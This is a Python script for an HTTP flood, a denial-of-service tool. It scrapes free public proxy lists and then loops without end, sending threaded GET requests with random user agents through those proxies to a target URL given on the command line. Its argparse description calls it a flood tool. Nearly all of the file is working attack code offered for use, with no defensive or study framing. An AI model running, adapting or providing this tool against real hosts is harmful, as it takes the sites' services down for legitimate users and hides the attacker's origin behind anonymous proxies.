import requests
import threading
import random
import argparse
import asyncio
from fake_useragent import UserAgent

ua = UserAgent()

async def scrape_proxies():
    apis = [
        'https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all',
        'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
        'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt'
    ]
    for host in apis:
        req = requests.get(host) 
        content = req.text.strip()
        with open("http.txt", "a+") as proxies_file:
            proxies_file.write(content)
    print(f'[{len(open("http.txt").readlines())}] proxies scraped, booting flood..')

def get_host(hostname: str, proxy: str):
    if len(proxy) < 3:
        return
    if not 'http://' in proxy:
        proxy = f'http://{proxy}'
        proxies = {'http': proxy.strip()}
        headers = {'User-Agent': ua.random}
        host = proxy.replace('http://', '').strip()
        ip = host.split(':')[0].strip()
        port = host.split(':')[1].strip()
        try:
            r = requests.get(hostname, headers=headers, proxies=proxies)
            if r.text:
                print(f'[{ip}:{port}] | {hostname} - success!')
            else:
                return
        except requests.RequestException as e:
            print(f'[{ip}:{port}] | {hostname} - failed: {e}')
            return

async def load_proxies_and_get(host: str, proxies_file_path: str, update_proxies: str):
    while True:
        try:
            if update_proxies == "y":
                await scrape_proxies()
                
            with open(proxies_file_path, 'r') as proxies_file:
                lines = proxies_file.readlines()
            
            threads = []
            num_threads = len(lines)
            
            for _ in range(num_threads):
                random_proxy = random.choice(lines)
                thread = threading.Thread(target=get_host, args=(host, random_proxy))
                threads.append(thread)
                thread.start()

            for thread in threads:
                thread.join()

        except KeyboardInterrupt:
            print("\nInterrompido pelo usuário.")
            break
        except Exception as e:
            print(f"Erro inesperado: {e}")
            break

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Flood requests to a hostname using threads & free proxies list')
    parser.add_argument('host', type=str, help='The URL of the host to flood.')
    parser.add_argument('proxies_file', type=str, help='Path to the file containing the list of proxies.')
    parser.add_argument("--update", type=str, help="(y/n) update proxies", default="n")
    args = parser.parse_args()
    
    asyncio.run(load_proxies_and_get(args.host, args.proxies_file, args.update))
